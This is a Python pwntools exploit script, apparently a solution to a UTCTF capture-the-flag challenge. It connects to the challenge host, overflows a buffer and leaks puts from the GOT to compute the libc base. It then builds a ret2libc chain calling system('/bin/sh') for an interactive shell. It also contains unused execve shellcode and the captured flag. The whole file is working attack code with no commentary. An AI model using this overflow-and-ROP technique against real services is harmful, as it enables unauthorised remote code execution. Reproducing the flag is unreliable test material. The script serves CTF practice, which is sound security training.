#!/usr/bin/env python3

from pwn import *

exe = ELF('shellcode_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+33
        b*main+270
        b*main+281

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('challenge.utctf.live',9009)
else:
    p = process([exe.path])
GDB()

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch = 'amd64')

# payload = shellcode
# print(shellcode)
# sla(b'<Insert prompt here>: \n',payload)

main = 0x000000000040061a
prdi = 0x0000000000400793
ret = 0x00000000004004a9
p1 = p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601900)
p1 += p64(ret) + p64(prdi) + p64(exe.got.puts) + p64(exe.plt.puts) +p64(main)
sla(b'<Insert prompt here>: \n',p1)
leak = u64(rl()[:-1]+b'\0\0')
base = leak - 0x6f6a0
info('Leak: '+hex(leak))
info('Base: '+hex(base))
libc.address = base
p2 = p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601200) + p64(0x601900)
p2 += p64(ret) + p64(prdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(libc.sym.system)
sla(b'<Insert prompt here>: \n',p2)
p.interactive()
# utflag{i_should_be_doing_ccdc_rn}